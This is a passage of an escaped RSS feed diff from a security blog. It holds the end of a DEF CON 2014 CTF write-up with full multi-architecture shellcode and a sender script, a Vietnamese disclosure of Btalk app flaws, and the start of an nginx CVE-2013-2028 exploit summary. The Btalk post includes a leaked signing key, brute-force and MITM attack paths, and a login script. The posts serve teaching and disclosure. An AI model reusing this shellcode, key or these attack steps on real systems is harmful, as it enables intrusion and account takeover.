+&lt;strong&gt;pc&lt;/strong&gt;           is set at 0×41000000&lt;br /&gt;
+&lt;strong&gt;r1&lt;/strong&gt; is sp and is set at 0×42000000&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;syscall number is passed in r0&lt;/strong&gt;, and &lt;strong&gt;arguments follow in r3,r4 etc.&lt;/strong&gt; &lt;strong&gt;return values are stored in r3&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;addi    1, 1, 0x400             //increment stack a bit (just in case)
+        xor     30, 30, 30              //wipe r30 just in case, as junk opcode modifies it
+        b       __flag_address          //jmp/call simulation in PowerPC
+__goback:
+        xor     4,4,4
+        mfspr   3, 8                    //get /flag into r3
+        li      0, 5                    //load r0 with 5
+        sc                              //system call (funny name of sc instruction)
+
+        //read
+        xor     4, 4, 4                 //xor r4, r4, r4
+        addi    4, 1, 0x0               //mov r1 to r4 &amp;lt;--- add is used to simulate mov
+        xor     5, 5, 5                 //do same for r5 as we did for r4
+        addi    5, 5, 0x64              //set r5 to 0x64, maybe better would be li... but who cares...
+        //r3 has fd
+        li      0, 3                    //r0 = read syscall (r3 is already set to fd)
+        sc
+
+        //write
+        xor     5, 5, 5                 //r5 to 0
+        addi    5 ,5, 0x64              //r5 to 0x64
+        xor     4, 4, 4
+        addi    4, 1, 0
+        xor     3, 3, 3                 //r3 = 0
+        addi    3, 3, 1                 //r3 = 1 (stdout)
+        li      0, 4                    //r0 = 4 (write)
+        sc                              //sc
+
+        xor     3, 3, 3
+        //exit
+        li      0, 1
+        sc
+
+__flag_address:
+        bl      __goback
+flag:   .ascii &quot;/flag&quot;
+&lt;/pre&gt;
+
+&lt;p&gt;My biggest error came in &lt;strong&gt;addi 4,1,0&lt;/strong&gt; as I didn’t use &lt;strong&gt;addi&lt;/strong&gt; but I’ve used &lt;strong&gt;add&lt;/strong&gt;, in this great syntax it assembles to: &lt;strong&gt;add r4, r1, r0&lt;/strong&gt; — r0 + SP and I just wanted to do &lt;strong&gt;addi r4, r1, 0&lt;/strong&gt; (easy way to move data from one register to another…). This took some time to figure, and was really really annoying part, as shellcode worked on their binary running on my PowerPC so it was hard to spot error. One way for me to test PowerPC (before I’ve noticed addi add error in shellcode) was to use &lt;strong&gt;/flags&lt;/strong&gt; instead of &lt;strong&gt;/flag&lt;/strong&gt; which would on open block server. I have no idea what /flags was on remote sysem, but server would hang and would not send any error back (no socket close, no reply, nothing, just idle state).&lt;/p&gt;
+
+&lt;p&gt;Now comes part where I need to put B to PowerPC and to skip over ARM code, and make it x86 compatible. This tooks some time, as I needed such instruction (and I found one) which is perfectly skipped by arm, but x86 wouldn’t like it (no matter what) as B in PowerPC starts with 0x4x which translates to inc/dec registers on x86. Next byte after 0x4x must be 0×0 so we don’t jump far (well it makes conditional jmp on PowerPC but I didn’t want to waste too much time on learning full PowerPC assembly)&lt;/p&gt;
+
+&lt;p&gt;One good solution which worked (but tnx to add r4, r1, r0) I thought that this time I had same problem like in arm, that my computer didn’t send enough data:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;code = &quot;&quot;;
+code += &quot;x40x00x04x05&quot;;
+code += &quot;x02x00x00x42&quot;;
+
+&lt;/pre&gt;
+
+&lt;p&gt;which translates to brilliant opcodes which are properly executed:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;ARM:
+0x00000000: streq r0, [r4, #-0x40]      &amp;lt;--- armel (doesn't store anything so it's good to go)
+0x00000004: andmi r0, r0, #2            &amp;lt;--- armel (who cares...)
+0x00000008: andmi r0, r0, r5, lsl #8    &amp;lt;--- armeb
+0x0000000c: andeq r0, r0, #0x42         &amp;lt;--- armeb
+PPC:
+0x00000000: bcl 0, 0, .+0x404           &amp;lt;--- excelent b to 0x404 for PowerPC
+x86:
+0x00000000: inc eax
+0x00000001: add byte ptr [eax + 0x42000002], al &amp;lt;--- brilliant write to who cares at stack
+
+&lt;/pre&gt;
+
+&lt;p&gt;But I abandoned this as I thought that 0×404 was wrong (eg. not all data was transferred ) So tnx to x86 instructions set where we can have arbitrary instruction size, I’ve decided to use next approach.&lt;/p&gt;
+
+&lt;p&gt;Next step was, lets make dummy instruction which will do &lt;strong&gt;jmp __overPPC_arm&lt;/strong&gt; and be almost like NOP for all other platforms. One pair of 2 byte instructions came to my mind. &lt;strong&gt;xor eax, eax/jz __x86 shellcode&lt;/strong&gt;, and many other options here (eg. stc/jb, clc/jnb, inc eax/jns, dec eax/js, test eax,eax/jz, test esp, esp/jnz, cmp/or/sub, endless options.):&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;code = &quot;&quot;;
+code += &quot;x33xc0x74x10&quot;;            #didn't put it after for armeb as bswaped
+                                                            #ppc doesn't give right results. but it's
+                                                            #do nothing for armeb
+code += &quot;x48x00x01x00&quot;;            #to test for armel
+code += &quot;x00x01x00x48&quot;;            #to test for armeb
+
+and capstone gives us back:
+
+
+ARM:
+0x00000000: rsbsne ip, r4, r3, lsr r0           #x86 code
+0x00000004: andeq r0, r1, r8, asr #32        #B for PPC as armel
+0x00000008: stmdami r0, {r8}                     #B for PPC as armeb
+PPC:
+0x00000000: addic r30, r0, 0x7410            #x86 code
+0x00000004: b .+0x100                             #our bracnh looks good...
+
+&lt;/pre&gt;
+
+&lt;p&gt;Now we place PowerPPC code at 0×104 offset and there we go. Running my assembly code against server gives back:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;---------------------------------------------------------------------------------------------------------
+xxx# python sendshellcode.py
+Password:
+
+
+Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.
+
+Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)
+
+Throwing shellcode against linux26-armel.(http://services.2014.shallweplayaga.me/polyglot_6a3875ce36a55889427542903cd43893)
+
+Throwing shellcode against linux26-armeb.(http://services.2014.shallweplayaga.me/polyglot_c0e7a26d7ce539efbecc970c154de844)
+
+Throwing shellcode against linux26-ppc.(http://services.2014.shallweplayaga.me/polyglot_5b78585342a3c116aebb5a9b45e88836)
+
+The flag is: I can tie a knot in a cherry stem
+
+xxx#
+---------------------------------------------------------------------------------------------------------
+
+&lt;/pre&gt;
+
+&lt;p&gt;And we got the flag : ** I can tie a knot in a cherry stem**&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;ARM shellcode:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;shellcode:
+        add     sp, #100
+        add     sp, #100
+        add     sp, #100
+        add     sp, #100
+
+        adr     r0, flag
+        mov     r1, 0
+        svc     0x900005
+        mov     r2, #100
+        mov     r1, sp
+        sub     r1, #100
+        svc     0x900003
+
+        mov     r2, #100
+        mov     r1, sp
+        sub     r1, #100
+        mov     r0, 1
+        svc     0x900004
+
+        mov     r0, 0
+        svc     0x900001
+flag:
+
+&lt;/pre&gt;
+
+&lt;p&gt;Final shellcode which shold be compield with nasm as : **nasm -fbin sc.asm -o sc.bin **&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;[BITS 32]
+
+
+                        db	0x33, 0xc0, 0x74, 0x10
+                        db	0x48, 0x00, 0x01, 0x00
+
+
+                        dd      0xEB0000E0
+                        dd      0xE00000EB
+
+__x86_shellcode:        nop
+                        nop
+                        nop
+                        nop
+                        nop
+                        nop
+                        nop
+                        add    esp, 0xFFC
+                        call   __delta
+__delta:                pop    ebp
+                        sub    ebp, __delta
+                        xor    ecx, ecx
+                        lea    ebx, [ebp+flag]
+                        mov    eax, 0x05
+                        int    0x80
+                        mov    esi, eax
+
+                        mov    edi, esp
+                        sub    edi, 0x200
+                        xor    eax, eax
+                        cld
+                        mov    ecx, 0x200
+                        rep    stosb
+                        mov    edi, esp
+                        sub    edi, 0x200
+
+                        mov    edx, 80
+                        mov    ecx, edi
+                        mov    ebx, esi
+                        mov    eax, 3
+                        int    0x80
+
+                        mov    edx, 80
+                        mov    ecx, edi
+                        xor    ebx, ebx
+                        mov    eax, ebx
+                        inc    ebx
+                        mov    eax, 4
+                        int    0x80
+                        xor    ebx, ebx
+                        mov    eax, 1
+                        int    0x80
+
+
+flag:                   db      &quot;/flag&quot;, 0
+buffer:
+                        times 0x104 - ($-$$) db 0xFF
+                        dd       0x00042138
+                        dd       0x78F2DE7F
+                        dd       0x58000048
+                        dd       0x7822847C
+                        dd       0xA602687C
+                        dd       0x05000038
+                        dd       0x02000044
+                        dd       0x7822847C
+                        dd       0x00008138
+                        dd       0x782AA57C
+                        dd       0x6400A538
+                        dd       0x03000038
+                        dd       0x02000044
+                        dd       0x782AA57C
+                        dd       0x6400A538
+                        dd       0x7822847C
+                        dd       0x00008138
+                        dd       0x781A637C
+                        dd       0x01006338
+                        dd       0x04000038
+                        dd       0x02000044
+                        dd       0x781A637C
+                        dd       0x01000038
+                        dd       0x02000044
+                        dd       0xADFFFF4B
+                        db       &quot;/flag&quot;, 0
+                        times 0x200 - ($-$$) db 0xFF
+                        align	4
+                        ;arm shellcode -&amp;gt; open in IDA and CPU set to ARM -&amp;gt; goto 0x200 (little endian)
+                        dd
+                        dd       0xE28DD064
+                        dd       0xE28DD064
+                        dd       0xE28DD064
+                        dd       0xE28DD064
+                        dd       0xE28F0030
+                        dd       0xE3A01000
+                        dd       0xEF900005
+                        dd       0xE3A02064
+                        dd       0xE1A0100D
+                        dd       0xE2411064
+                        dd       0xEF900003
+                        dd       0xE3A02064
+                        dd       0xE1A0100D
+                        dd       0xE2411064
+                        dd       0xE3A00001
+                        dd       0xEF900004
+                        dd       0xE3A00000
+                        dd       0xEF900001
+                        db       &quot;/flag&quot;, 0
+
+
+                        times 0x300 - ($-$$) db 0xFF
+                        align    4
+                        ;big endian arm shellcode -&amp;gt; same procedure like for previos ARM but select big endian arm
+                        ;shellcodes are exactly them same with change that this one is convereted to big-endian
+                        dd       0x64D08DE2
+                        dd       0x64D08DE2
+                        dd       0x64D08DE2
+                        dd       0x64D08DE2
+                        dd       0x30008FE2
+                        dd       0x0010A0E3
+                        dd       0x050090EF
+                        dd       0x6420A0E3
+                        dd       0x0D10A0E1
+                        dd       0x641041E2
+                        dd       0x030090EF
+                        dd       0x6420A0E3
+                        dd       0x0D10A0E1
+                        dd       0x641041E2
+                        dd       0x0100A0E3
+                        dd       0x040090EF
+                        dd       0x0000A0E3
+                        dd       0x010090EF
+                        db       &quot;/flag&quot;, 0
+
+                        ;LDR    pc, [pc, #4]		little endian
+                        ;LDR    pc, [pc, #4]	 	big endian
+                        times    0x390 - ($-$$) db 0xFF
+                        dd       0xE59FF000
+                        dd       0x00F09FE5
+                        dd       0x41000200
+                        dd       0x00030041
+
+
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Generic python code for CTF when user input is required:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;SELECT_TIMEOUT = 2;
+
+def	callmefunc(sock, buff):
+	print(buff);
+	if &quot;Password&quot; in buff:
+		sock.send(&quot;w0rk_tHaT_tAlEnTeD_t0nGu3n&quot;);
+	if &quot;Give me shellcode&quot; in buff:
+		f = open(&quot;sc.bin&quot;, &quot;rb&quot;);
+		buff = f.read();
+		sock.send(buff);
+	return 0;
+
+def	recv_all(sock, callme):
+	buff = &quot;&quot;;
+	while True:
+		rlist = select.select([sock,], [], [], SELECT_TIMEOUT)[0];
+		if len(rlist) == 0: continue;
+		try:
+			buff = sock.recv(0x1000);
+		except:
+			break;
+		if not buff: break;
+		ret = callme(sock, buff);
+		if ret != 0:
+			sock.close();
+			return;
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+sock.connect((&quot;polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me&quot;, 30000));
+
+recv_all(sock, callmefunc);
+
+exit();
+
+
+&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;capstone python code for testing&lt;/strong&gt;&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;import capstone
+
+
+#code =  &quot;xE0x00x00xEB&quot;;
+#code += &quot;xEBx00x00xe0&quot;;
+code = &quot;&quot;;
+code += &quot;x33xc0x74x10&quot;;
+code += &quot;x48x00x01x00&quot;;
+code += &quot;x00x01x00x48&quot;;
+
+print(&quot;ARM:&quot;)
+md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM);
+data = md.disasm(code, 0x0);
+for insn in data:
+	print(&quot;0x%.08x: %s %s&quot; % (insn.address, insn.mnemonic, insn.op_str));
+
+
+print(&quot;PPC:&quot;);
+md = capstone.Cs(capstone.CS_ARCH_PPC, capstone.CS_MODE_BIG_ENDIAN);
+data = md.disasm(code, 0x0);
+for insn in data:
+	print(&quot;0x%.08x: %s %s&quot; % (insn.address, insn.mnemonic, insn.op_str));
+
+
+print(&quot;x86:&quot;);
+md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32);
+data = md.disasm(code, 0x0);
+for insn in data:
+        print(&quot;0x%.08x: %s %s&quot; % (insn.address, insn.mnemonic, insn.op_str));
+&lt;/pre&gt;
+
+</description>
+        <pubDate>Thu, 22 May 2014 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/ctf%20-%20clgt%20crew/uncategorized/2014/05/22/defcon-2014-polyglot.html</link>
+        <guid isPermaLink="true">http://localhost:8000/ctf%20-%20clgt%20crew/uncategorized/2014/05/22/defcon-2014-polyglot.html</guid>
+        
+        
+        <category>ctf - clgt crew</category>
+        
+        <category>uncategorized</category>
+        
+      </item>
+    
+      <item>
+        <title>Phân tích ứng dụng Btalk trên Android &amp;#8211; Phần một: Cơ chế xác thực người dùng</title>
+        <description>&lt;p&gt;&lt;strong&gt;Lưu ý: các phân tích trong bài viết này được dựa trên phiên bản Btalk 1.0.6 tải về từ PlayStore. Các vấn đề được nêu trong bài viết này BKAV đã được gửi email thông báo từ trước.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p style=&quot;text-align: right&quot;&gt;
+  &lt;strong&gt;(pdah &amp;#8211; cb_ &amp;#8211; k9)&lt;br /&gt; &lt;/strong&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;c-ch-ng-k-v-kch-hot&quot;&gt;Cơ chế đăng ký và kích hoạt&lt;/h2&gt;
+
+&lt;p&gt;Quá trình xác thực trên điện thoại của Btalk  gồm 3 bước chính:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Đăng ký tài khoản với Btalk: 
+    &lt;ul&gt;
+      &lt;li&gt;Người dùng gửi thông tin về số điện thoại đang sử dụng cho máy chủ Btalk.&lt;/li&gt;
+      &lt;li&gt;Btalk gửi tin nhắn kèm mã số xác thực đến số điện thoại người dùng.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Xác nhận (kích hoạt) tài khoản: 
+    &lt;ul&gt;
+      &lt;li&gt;Mã số xác thực được nhập và gửi lại Btalk&lt;/li&gt;
+      &lt;li&gt;Btalk xác nhận đúng mã xác thực và gửi lại mật khẩu khởi tạo riêng cho mỗi phiên đăng ký.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Đăng ký với hệ thống nhắn tin OpenSIPS 
+    &lt;ul&gt;
+      &lt;li&gt;Mật khẩu kèm thông tin số điện thoại được gửi lại hệ thống OpenSIPS của Btalk&lt;/li&gt;
+      &lt;li&gt;Btalk xác nhận đã nhận được thông tin&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;bc-1-8211-ng-k-ti-khon-vi-btalk&quot;&gt;Bước 1 – Đăng ký tài khoản với Btalk:&lt;/h3&gt;
+
+&lt;p&gt;Sau khi người dùng nhập số điện thoại, một HTTP GET Request được gửi từ ứng dụng Btalk đến API &lt;a href=&quot;https://bmail.vn/service/preauth&quot;&gt;https://bmail.vn/service/preauth&lt;/a&gt; với các tham số sau:&lt;/p&gt;
+
+&lt;pre style=&quot;text-align: left&quot;&gt;&lt;code&gt;domain       = bmail.vn
+from         = bphone
+reqType      = bphoneRegister
+txtDomain    = bmail.vn
+useServerSms = true
+txtUser      = &amp;lt;số điện thoại kèm mã quốc gia&amp;gt;@bmail.vn
+timestamp    = &amp;lt;timestamp&amp;gt;
+preauth      = &amp;lt;hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Tham số &lt;code&gt;preauth&lt;/code&gt; được sử dụng để “ký” các thông tin được thiết bị gửi đến máy chủ Btalk. Mục đích chính là để xác nhận thông tin được gửi từ một nguồn hợp lệ. Điều này được thể hiện qua việc API gửi về &lt;code&gt;isTrustedDomain=false&lt;/code&gt; nếu chúng ta gửi giá trị ngẫu nhiên cho &lt;code&gt;preauth&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Giá trị của &lt;code&gt;preauth&lt;/code&gt; được xác định như sau:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;preauth = HMAC_SHA1(key, domain + ’|’ + timestamp + ‘|’ + txtUser)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nếu thông tin được ký đúng, API trả về một HTTP Response rỗng đồng thời hệ thống gửi một tin nhắn chứa mã số xác thực (gồm 4 ký số) đến số di động của người dùng. Nội dung của tin nhắn có dạng:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Your Btalk code is XXXX.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;bc-2-8211-xc-nhn-ti-khon&quot;&gt;Bước 2 – Xác nhận tài khoản&lt;/h3&gt;
+
+&lt;p&gt;Sau khi có mã số xác thực, ứng dụng Btalk tiếp tục gửi một HTTP GET Request đến &lt;a href=&quot;https://bmail.vn/service/preauth&quot;&gt;https://bmail.vn/service/preauth&lt;/a&gt; với danh sách các tham số:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;txtDomain   = bmail.vn
+from        = bphone
+reqType     = bphoneRegister
+op          = verifyCode
+txtDomain   = bmail.vn
+txtUser     = &amp;lt;số điện thoại kèm mã quốc gia&amp;gt;@bmail.vn
+timestamp   = &amp;lt;timestamp&amp;gt;
+verifyCode  = &amp;lt;code&amp;gt;
+preauth     = &amp;lt;hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Với preauth được xác định bằng:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;preauth = HMAC_SHA1(key, timestamp + ’|’ + txtUser + ‘|’ + verifyCode)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nếu Btalk gửi đúng mã xác nhận, API sẽ gửi về mật khẩu (gồm 8 ký tự). Trên lý thuyết, với số điện thoại và mật khẩu này, chúng ta có thể gửi và nhận tin nhắn thông qua máy chủ của Btalk. Tuy nhiên chúng ta không thể làm điều đó nếu chưa thực hiện bước tiếp theo.&lt;/p&gt;
+
+&lt;h3 id=&quot;bc-3-8211-ng-k-vi-h-thng-nhn-tin-opensips&quot;&gt;Bước 3 – Đăng ký với hệ thống nhắn tin OpenSIPS&lt;/h3&gt;
+
+&lt;p&gt;Ứng dụng Btalk gửi một HTTP POST Request đến dịch vụ OpenSIPS tại &lt;a href=&quot;https://btalk.bkav.com:8443/OpenSipsServices/rest/sip/register&quot;&gt;https://btalk.bkav.com:8443/OpenSipsServices/rest/sip/register&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Với tham số:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;username  = &amp;lt;số điện thoại kèm mã quốc gia&amp;gt;
+password  = &amp;lt;mật khẩu&amp;gt;
+timestamp = &amp;lt;timestamp&amp;gt;
+preauth   = &amp;lt;hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Trong đó&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;preauth = HMAC_SHA1(key, timestamp + ’|’ + password + ‘|’ + username + ‘@bmail.vn’)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sau bước này ứng dụng Btalk đã có thể đăng nhập vào hệ thống XMPP của Btalk đồng thời gửi, nhận tin nhắn.&lt;/p&gt;
+
+&lt;h2 id=&quot;cc-vn-&quot;&gt;Các vấn đề&lt;/h2&gt;
+
+&lt;h3 id=&quot;l-key-kha-ca-hm-bm-m-ha&quot;&gt;Lộ key (khóa) của hàm băm mã hóa&lt;/h3&gt;
+
+&lt;p&gt;Như chúng tôi mô tả ở trên, Btalk sử dụng HMAC-SHA1 để ký các HTTP requests gửi đi từ ứng dụng trên điện thoại. Về cơ bản HMAC-SHA1 giúp người sử dụng kiểm tra tính đồng nhất của dữ liệu, đồng thời chứng thực phía gửi dữ liệu thông qua tính bí mật của khóa key. Tuy nhiên giá trị của key được nhúng trong ứng dụng Btalk và chúng ta có thể tìm thấy nó dễ dàng:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Configuration.REGISTER_KEY = &quot;41ab3e484f918ff0d378058e50eb0f79e93d19383ca1053830a878a83bcce3fc&quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Điều này dẫn đến việc bất kỳ ai cũng có thể giả mạo ứng dụng Btalk để gửi HTTP requests đến máy chủ.&lt;/p&gt;
+
+&lt;h3 id=&quot;spam-tin-nhn-xc-thc-n-s-di-ng-khc&quot;&gt;Spam tin nhắn xác thực đến số di động khác&lt;/h3&gt;
+
+&lt;p&gt;Một hệ quả của vấn đề trên là chúng ta có thể spam số máy di động khác bằng cách liên tục giả lập bước một của cơ chế xác thực.&lt;/p&gt;
+
+&lt;h3 id=&quot;ly-cp-thng-tin-ng-nhp-thng-qua-vt-cn-m-xc-thc&quot;&gt;Lấy cắp thông tin đăng nhập thông qua vét cạn mã xác thực&lt;/h3&gt;
+
+&lt;p&gt;Ở bước một và hai, mã xác thực chỉ có 4 ký số và không bị vô hiệu trong khoản thời gian nhất định, chúng ta có thể liên tục lặp lại bước hai với tối đa 10.000 khả năng khác nhau của mã xác thực cho đến khi nào nhận được mật khẩu.&lt;/p&gt;
+
+&lt;p&gt;Thời gian ước tính để thử chọn hết tất cả các khả năng (10.000 trường hợp) là khoảng 1 giờ đồng hồ. Giả sử nhà phát triển lựa chọn phương án vô hiệu hóa mã xác thực trong 5 phút, chúng ta sẽ có cơ hội thử chọn khoảng 830 trường hợp, đồng nghĩa với khoảng 8.3% cơ hội thành công. Đây vẫn là một con số không nhỏ.&lt;/p&gt;
+
+&lt;h3 id=&quot;ssl-vn-khng-an-ton&quot;&gt;SSL vẫn không an toàn&lt;/h3&gt;
+
+&lt;p&gt;Mặc dù Btalk sử dụng SSL cho tất cả các bước xác thực người dùng, nhưng nhà phát triển cho phép ứng dụng chấp nhận tất cả các certificate mà nó nhận được bằng cách:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Định nghĩa lại lớp BkavSSLSocketFactory thay cho lớp SSLSocketFactory mặc định và bỏ hết tất cả các bước chứng thực certificate.&lt;/li&gt;
+  &lt;li&gt;Bỏ qua việc kiểm tra hostname của certificate: 
+      KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
+      keyStore.load(null, null);
+      BkavSSLSocketFactory socketFactory = new BkavSSLSocketFactory(keyStore);
+      (()SSLSocketFactory)socketFactory).setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Điều này cho phép hacker có thể thực hiện tấn công MITM và “nhìn lén” tất cả dữ liệu của người dùng.&lt;/p&gt;
+
+&lt;h2 id=&quot;mt-vi-iu-th-v-khc&quot;&gt;Một vài điều thú vị khác&lt;/h2&gt;
+
+&lt;h3 id=&quot;gi-lp-gi-v-nhn-tin-nhn-t-sau-khi-c-c-mt-khu&quot;&gt;Giả lập gửi và nhận tin nhắn từ sau khi có được mật khẩu&lt;/h3&gt;
+
+&lt;h4 id=&quot;trn-in-thoi--root-hoc-emulator&quot;&gt;1. Trên điện thoại (đã root) hoặc emulator:&lt;/h4&gt;
+
+&lt;p&gt;Sau khi cài Btalk, điều chỉnh thông tin đăng nhập của ứng dụng tại &lt;strong&gt;/data/data/bkav.android.btalk/shared_prefs/bkav.android.btalk_preferences.xml&lt;/strong&gt; với số điện thoại và mật khẩu lấy được.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;...
+
+&amp;lt;string name=&quot;bkav_pref_sipx_password&quot;&amp;gt;YYYYYYYY&amp;lt;/string&amp;gt;
+&amp;lt;string name=&quot;bkav_pref_sipx_username&quot;&amp;gt;84XXXXXXXXXXX&amp;lt;/string&amp;gt;
+
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;thng-qua-vit-m&quot;&gt;2. Thông qua viết mã&lt;/h4&gt;
+
+&lt;p&gt;Đoạn mã đơn giản sau giả lập việc gửi và nhận tin nhắn qua Btalk:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;import xmpp
+import time
+
+username = '84xxxxxxxx'
+passwd   = 'yyyyyyy'
+to       = '84zzzzzzzzz@bmail.vn'
+msg      = 'Hello from a script'
+
+def message_callback(client, stanza):
+    sender       = stanza.getFrom()
+    message_type = stanza.getType()
+    message      = stanza.getBody()
+
+print &quot;Received '%s' from '%s'&quot; % (message, sender)
+
+client = xmpp.Client('bmail.vn', debug=[])
+client.connect(server=('chat.bkav.com',5222))
+client.auth(username, passwd, 'bmail.vn')
+client.RegisterHandler(&quot;message&quot;, message_callback)
+
+client.sendInitPresence()
+message = xmpp.Message(to, msg)
+message.setAttr('type', 'chat')
+print &quot;Sending message ...&quot;
+client.send(message)
+
+print &quot;Waiting for message ...&quot;
+while client.isConnected():
+    client.send(xmpp.Presence())
+    client.Process()
+    time.sleep(1)
+&lt;/pre&gt;
+
+&lt;h3 id=&quot;ci-g-y-&quot;&gt;Cái gì đây ?&lt;/h3&gt;
+
+&lt;p&gt;Chúng tôi phát hiện một vài đoạn mã thú vị trong ứng dụng Btalk:&lt;/p&gt;
+
+&lt;p&gt;&lt;img class=&quot;alignnone&quot; src=&quot;https://dl.dropbox.com/s/svfdurmp8gw0i5x/Screen%20Shot%202014-05-06%20at%2010.00.47%20pm-1.png&quot; alt=&quot;&quot; width=&quot;521&quot; height=&quot;136&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cho dù BKAV đã thay đổi tên đăng nhập và/hoặc mật khẩu của dịch vụ liên quan ở phía máy chủ, việc để lọt những dòng mã như thế này lên Play Store cho thấy nhà phát triển chưa làm tốt khâu kiểm định mã nguồn trước khi xuất xưởng.&lt;/p&gt;
+
+&lt;p&gt;(còn tiếp)&lt;/p&gt;
+</description>
+        <pubDate>Tue, 06 May 2014 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/headlines/2014/05/06/btalk-part-1.html</link>
+        <guid isPermaLink="true">http://localhost:8000/headlines/2014/05/06/btalk-part-1.html</guid>
+        
+        <category>android</category>
+        
+        <category>btalk</category>
+        
+        <category>mobile</category>
+        
+        
+        <category>headlines</category>
+        
+      </item>
+    
+      <item>
+        <title>Exploiting nginx chunked overflow bug, the undisclosed attack vector (CVE-2013-2028)</title>
+        <description>&lt;p&gt;In &lt;a href=&quot;http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/&quot;&gt;previous post&lt;/a&gt;, we analyzed and exploited stack based buffer overflow vulnerability in chunked encoding parsing of nginx-1.3.9 – 1.4.0. We mentioned that there was another attack vector which was more practical, more reliable. I talked about this attack vector at &lt;a href=&quot;http://www.secuinside.com&quot;&gt;SECUINSIDE&lt;/a&gt; 2013 in July (btw, a great conference and CTF). Details can be found in &lt;a href=&quot;http://ropshell.com/slides/Nginx_chunked_overflow_the_undisclosed_attack_vector.pdf&quot;&gt;slides&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In summary:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Same &lt;a href=&quot;http://www.vnsecurity.net/2013/05/analysis-of-nginx-cve-2013-2028/&quot;&gt;bug&lt;/a&gt; with different code paths that serve dynamic contents via fastcgi, proxy backend, etc. These configurations are more practical in real world environments.&lt;/li&gt;
+  &lt;li&gt;Heap based overflow instead of stack based overflow as described in the original advisory. Nothing to worry about stack cookie (so no bruteforcing).&lt;/li&gt;
+  &lt;li&gt;The trick to make heap overflow exploit more reliable is via connection spraying.&lt;/li&gt;
+  &lt;li&gt;Some small tips and tricks for ROP and shellcode.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Enjoy hacking!&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 17 Jul 2013 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</link>
+        <guid isPermaLink="true">http://localhost:8000/research/2013/07/17/exploiting-nginx-chunked-overflow-bug-the-undisclosed-attack-vector-cve-2013-2028.html</guid>
+        
+        <category>1.4.0</category>
+        
+        <category>cve-2013-2028</category>
+        
+        <category>exploit</category>
+        
